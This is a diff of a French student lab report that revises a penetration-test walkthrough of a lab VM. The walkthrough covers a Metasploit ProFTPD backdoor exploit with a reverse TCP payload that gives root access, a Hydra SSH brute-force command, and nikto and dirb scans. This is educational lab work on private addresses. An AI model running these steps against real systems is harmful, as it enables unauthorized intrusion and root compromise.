@@ -14,9 +14,9 @@ On voit que 3 ports sont ouverts : le 21, le 22 et le 80
 
 ## Port 21
 
-On peut essayer de se connecter en ftp (avec l'identifiant et le mdp 'ftp')
+Le port 21 utilise ftp. On peut donc essayer de se connecter en ftp (avec l'identifiant et le mdp 'ftp' ou 'anonyme') ce qui permettrait de se connecter si le serveur autorisait les connexion en mode anonyme.
 `ftp 10.0.2.6`
-La connexion echoue.
+Malheureusement, le serveur n'autorise as les connexion en mode anonyme et la connexion echoue.
 
 ![1732270713862](image/rapport-tp3/1732270713862.png)
 
@@ -28,42 +28,40 @@ On peut essayer d'utiliser `msfconsole` pour accéder au shell metasploit qui pe
 
 ![1732274049690](image/rapport-tp3/1732274049690.png)
 
-`use 0` pour séléctionner "exploit/unix/ftp/proftpd_133c_backdoor"
+Une seule vulnérabilité est connue. On tape la commande `use 0` pour séléctionner le seul et unique exploit ("exploit/unix/ftp/proftpd_133c_backdoor").
 
 ![1732274737827](image/rapport-tp3/1732274737827.png)
 
-En accédant aux `options`, on constate que rhost n'est pas configuré. On défini donc l'ip de rhost.
+En accédant aux `options`, on constate que rhost n'est pas configuré. rhosts permet de spécifier l'ip de la cible. On va donc lui attribué sa valeur "10.0.2.6".
 `set rhost 10.0.2.6`
 
-Rport est correctement cofiguré, on y touche pas.
+Rport est correctement configuré pour le port 21, on y touche pas.
 
-On affiche les payloads
+On veut utiliser un reverse shell pour tenter de se connecter à la machine cible. On affiche donc les payloads disponibles.
 
 ![1732274488451](image/rapport-tp3/1732274488451.png)
 
-Dans notre cas, on veux une reverse TCP connexion donc on séléctionne l'élément 4 `set payload 4`
+Dans notre cas, on va faire une reverse TCP connexion donc on séléctionne le payload 4 `set payload 4`.
 
-Dans les options, on voit que LHOST est requis mais n'est pas défini. Il faut donc lui assigné l'ip de la machine hôte.
+Dans les options, Lhost est requis mais n'est pas défini. Il faut donc lui assigner l'ip de la machine hôte.
 `set lhost 10.0.2.4`
 
-Avec la commande `run`, on peut maintenant exploiter la faille de sécurité pour se connecter en ftp.
+Avec la commande `run`, on peut maintenant exploiter la faille de sécurité et se connecter au reverse shell.
 
 ![1732275074257](image/rapport-tp3/1732275074257.png)
 
-On constate qu'une connexion est bien ouverte (10.0.2.4:4444 -> 10.0.2.6:34682) et si je tape la commande `whoami`, je suis bien utilisateur root. De plus, 
-
-Je peux ouvrir un shell et faire toutes les manipulations souhaitées sur la machine cible en tant que root.
+On constate qu'une connexion est bien ouverte (10.0.2.4:4444 -> 10.0.2.6:34682) et si je tape la commande `whoami`, je suis directement utilisateur root. De plus, Je peux ouvrir un shell et faire toutes les manipulations souhaitées sur la machine cible en tant que root.
 
 ![1732275364664](image/rapport-tp3/1732275364664.png)
 
 ## Port 22
 
 Le port 22 est associé à ssh donc on va faire une attaque brut force en utilisant hydra.
-`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.6`
+`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://10.0.2.6` (ip différentes du reste du tp car fais à un autre moment et elle avait changé entre temps)
 
 Sans succès...
 
-![1732271041497](image/rapport-tp3/1732271041497.png)
+![1733940325504](image/rapport-tp3/1733940325504.png)
 
 ## Port 80
 
@@ -80,7 +78,6 @@ Je peux faire un scan nikto
 
 ![1732271735114](image/rapport-tp3/1732271735114.png)
 
-
 Je peux également utliser dirb.
 
 `dirb http://10.0.2.6`
@@ -93,10 +90,10 @@ On se rend donc à l'url `http://10.0.2.6/secret`
 
 On tombe sur un "blog secret"
 
-Lorsque l'on clique sur les lien, cela nous redirige vers une pga inacessible et l'url change `vtcsec/...`
+Lorsque l'on clique sur les lien, cela nous redirige vers une page inacessible et l'url change `vtcsec/...`
 
 ![1732271364228](image/rapport-tp3/1732271364228.png)
 
-Après avoir réussi à accéder à la machine en tant que root en passant par le port 21, je me rend compte que "vtcsec" correspond bien à l'utilisateur root
+Après avoir réussi à accéder à la machine en tant que root en passant par le port 21, je me rend compte que "vtcsec" correspond bien au nom d'utilisateur de la machine cible.
 
 ![1732275561481](image/rapport-tp3/1732275561481.png)
